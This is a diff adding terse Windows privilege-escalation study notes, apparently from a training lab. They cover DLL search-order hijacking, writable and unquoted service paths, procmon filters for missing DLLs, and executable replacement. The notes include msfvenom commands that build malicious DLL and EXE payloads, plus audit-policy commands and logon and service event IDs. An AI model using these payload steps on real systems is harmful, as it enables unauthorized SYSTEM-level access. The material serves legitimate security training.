@@ -1,0 +1,102 @@
+exe check following locations in order
+
+1HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
+2The directory the the Application was run from <-------------------------------------######################## !!!! important !!!!
+3The directory specified in in the C+ function GetSystemDirectory()
+4The directory specified in the C+ function GetWindowsDirectory()
+5The current directory
+
+System level = system services (LocalSystem, LocalService, NetworkService)
+
+
+.\sigcheck -m -accepteula C:\Windows\System32\eventvwr.exe
+
+
+scheduled tasks & services
+check
+  write permissions  <-------#####
+  non-standard locations 
+  unquoted executables paths
+  vuln in exes
+  permissions to run as SYSTEM 
+
+----use services application on windows 
+look for services wihtout a description or wierdly named
+go to executbale path, check if you have write permissions to folder application is in, try making a file inside th folder
+see if you can rename executable
+
+launch procmon -m -accepteula
+filters to add:
+process name contains _______ (executable name)
+path contains .dll
+result is NAME NOT FOUND
+
+of the results with the same path as executable, we can craft a .dll with one of these names
+                                                                path that we are able to write to             name from listed dlls
+msfvenom -p windows/exec CMD='cmd.exe /C "<desired command>" > C:\users\student\desktop\whoami.txt' -f dll > SSPICLI.dll
+
+(get-process | ? {$_.name -conatins "putty"}).kill() incase you need to kill a service and run it agian to see output
+
+
+-----exe replacement
+rename original exxe
+craft new exe with payload
+
+
+                                                                path that we are able to write to             name of orig exe
+msfvenom -p windows/exec CMD='cmd.exe /C "<desired command>" > C:\users\student\desktop\whoami.txt' -f exe > <name>.exe
+
+
+
+
+auditing enabled on system
+auditpol /get /category:*
+auditpol /get /category:* | findstr /i "success failure"
+
+4624/4625 Successful/failed login
+
+4720 Account created
+
+4672 Administrative user logged on
+
+7045 Service created
+
+powershell logging
+
+msfvenom -l payloads | grep 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
